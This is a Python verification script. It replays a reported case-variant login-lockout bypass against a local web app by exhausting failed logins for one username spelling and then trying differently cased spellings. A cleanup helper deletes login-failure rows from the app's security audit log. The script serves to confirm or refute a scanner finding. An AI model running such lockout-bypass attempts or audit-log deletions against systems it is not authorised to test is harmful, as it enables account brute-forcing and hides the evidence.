#!/usr/bin/env python3
"""
End-to-end HTTP reproduction of the Strix "case-variant lockout bypass" CRITICAL
finding (2026-09-21 re-run). Replays Strix's OWN PoC and reports whether the
bypass actually occurs.

Run from the repo root so `config.php` is importable for the cleanup step.
"""
import time
import re
import sys
import sqlite3  # noqa: F401 (kept only to fail loudly if stdlib is broken)

import requests
import urllib3

urllib3.disable_warnings()
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8001"


def clear_throttle():
    """Best-effort: clear login audit rows so results are deterministic."""
    try:
        import subprocess
        subprocess.run(
            ["php", "-r",
             'require "config.php"; $c=$GLOBALS["connect"];'
             '$c->exec("DELETE FROM SECURITY_AUDIT_LOG WHERE event IN (\\"login_fail\\",\\"login_locked\\",\\"login_reject_input\\")");'],
            cwd=".", capture_output=True, timeout=30)
    except Exception as e:  # noqa: BLE001
        print("  (cleanup skipped:", e, ")")


def attempt(username, password, user_type="nip"):
    """One login attempt with a fresh session. Returns (status, seconds, locked)."""
    s = requests.Session()
    page = s.get(BASE + "/login", timeout=15).text
    m = re.search(r'name="csrf_token" value="([0-9a-f]{64})"', page)
    if not m:
        return (0, 0.0, False, "NO CSRF")
    tok = m.group(1)
    t0 = time.time()
    r = s.post(BASE + "/action/login",
               data={"csrf_token": tok, "user_type": user_type,
                     "username": username, "password": password},
               headers={"Content-Type": "application/x-www-form-urlencoded"},
               timeout=25, allow_redirects=True)
    dt = time.time() - t0
    locked = "Terlalu banyak" in r.text
    return (r.status_code, dt, locked, "")


def line(label, res):
    st, dt, locked, extra = res
    print(f"  {label:16} status={st} time={dt:5.2f}s locked={'YES' if locked else 'no '} {extra}")


print("=" * 68)
print(" CASE-VARIANT LOCKOUT - end-to-end HTTP repro (Strix CRITICAL claim)")
print(" target:", BASE)
print("=" * 68)

print("\n--- STEP 1: both spellings reach the same account (bcrypt ~0.7s) ---")
line("ADMIN001/wrong", attempt("ADMIN001", "wrongpw"))
line("admin001/wrong", attempt("admin001", "wrongpw"))

print("\n--- STEP 2: exhaust ONE spelling (ADMIN001) -> expect lock on 6th ---")
for i in range(1, 7):
    line(f"attempt {i}", attempt("ADMIN001", f"bad{i}"))

print("\n--- STEP 3: switch SPELLING -> does it bypass the lock? ---")
line("admin001/wrong", attempt("admin001", "wrongpw"))
line("Admin001/wrong", attempt("Admin001", "wrongpw"))
line("aDmIn001/wrong", attempt("aDmIn001", "wrongpw"))

print("\n--- STEP 4: control - same spelling stays locked ---")
line("ADMIN001/wrong", attempt("ADMIN001", "wrongpw"))

print("\n" + "=" * 68)
print(" INTERPRETATION")
print("  - If STEP 3 shows locked=YES for other spellings => NO bypass")
print("    => Strix's CRITICAL case-variant claim is a FALSE POSITIVE.")
print("  - If STEP 3 shows locked=no => bypass CONFIRMED => fix required.")
print("=" * 68)
